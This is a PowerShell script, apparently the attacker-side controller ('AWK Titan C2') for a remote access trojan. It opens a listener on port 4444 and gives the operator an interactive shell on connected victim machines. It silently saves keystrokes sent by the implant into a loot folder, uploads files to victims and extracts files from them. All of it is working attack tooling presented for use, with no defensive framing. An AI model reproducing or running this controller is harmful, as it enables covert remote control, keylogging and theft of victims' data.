# Execute the following script through Administrator Access of Powershell in Attacker's Device to start the listening on 4444 Custom Port.




# --- [AWK] MASTER CONTROLLER v9.5 ---
$port = 4444
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
$lootDir = "$env:USERPROFILE\Desktop\AWK_Loot"
$keyFile = Join-Path $lootDir "live_keys.txt"

if (!(Test-Path $lootDir)) { New-Item -ItemType Directory -Path $lootDir | Out-Null }

try {
    $listener.Start()
    Write-Host "[!] AWK TITAN C2 ONLINE - LISTENING..." -ForegroundColor Cyan

    $client = $listener.AcceptTcpClient(); $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)
    
    Write-Host "[+] Connection Established: $($client.Client.RemoteEndPoint.Address)" -ForegroundColor Green
    Write-Host "[*] SILENT LOGGING: Keystrokes are saving to AWK_Loot\live_keys.txt`n" -ForegroundColor Gray

    while($client.Connected) {
        # 1. BACKGROUND DATA CLEANER (Handles silent keys while idling)
        while ($stream.DataAvailable) {
            $peek = $reader.ReadLine()
            if ($peek -eq "---K---") {
                $k = $reader.ReadLine(); $reader.ReadLine() | Out-Null
                $k | Out-File $keyFile -Append -NoNewline
            }
        }

        # 2. COMMAND INPUT
        $command = Read-Host "AWK-Shell"
        if ([string]::IsNullOrWhiteSpace($command)) { continue }

        # 3. PUSH HANDLER (INFILTRATION)
        if ($command -like "push *") {
            $localPath = $command.Substring(5).Trim()
            if (Test-Path $localPath) {
                $fileName = Split-Path $localPath -Leaf
                $writer.WriteLine("silent_put")
                $writer.WriteLine($fileName)
                $writer.WriteLine([Convert]::ToBase64String([IO.File]::ReadAllBytes($localPath)))
                Write-Host "[*] Infiltrating $fileName..." -ForegroundColor DarkCyan
            } else { Write-Host "[-] Local file not found." -ForegroundColor Red; continue }
        } else {
            $writer.WriteLine($command)
            $writer.Flush()
        }

        if ($command -eq "exit" -or $command -eq "boom") { break }

        # 4. RESPONSE SYNCHRONIZER
        $lootBuffer = ""; $isLooting = $false; $currentFile = ""
        while ($true) {
            $line = $reader.ReadLine()
            if ($line -eq "PS_READY" -or $line -eq $null) { break }

            # Handle Keys during command execution
            if ($line -eq "---K---") {
                $keys = $reader.ReadLine(); $reader.ReadLine() | Out-Null
                $keys | Out-File $keyFile -Append -NoNewline
                continue
            }

            # --- FILE EXTRACTION LOGIC (PULL/SNAP) ---
            if ($line -eq "---START_FILE---") {
                $currentFile = $reader.ReadLine()
                $isLooting = $true
                Write-Host "[*] Extracting: $currentFile..." -ForegroundColor Cyan
                continue
            }
            if ($line -eq "---END_FILE---") {
                $isLooting = $false
                [IO.File]::WriteAllBytes((Join-Path $lootDir $currentFile), [Convert]::FromBase64String($lootBuffer))
                Write-Host "[+] Successfully Saved to AWK_Loot." -ForegroundColor Green
                $lootBuffer = ""; continue
            }

            if ($isLooting) { 
                $lootBuffer += $line 
            } else { 
                # Standard Console Output (find, ls, whoami, cat)
                Write-Host $line -ForegroundColor Gray 
            }
        }
    }
} catch { 
    Write-Host "`n[-] Connection terminated." -ForegroundColor Red 
} finally { 
    $listener.Stop(); if($client){$client.Close()}
}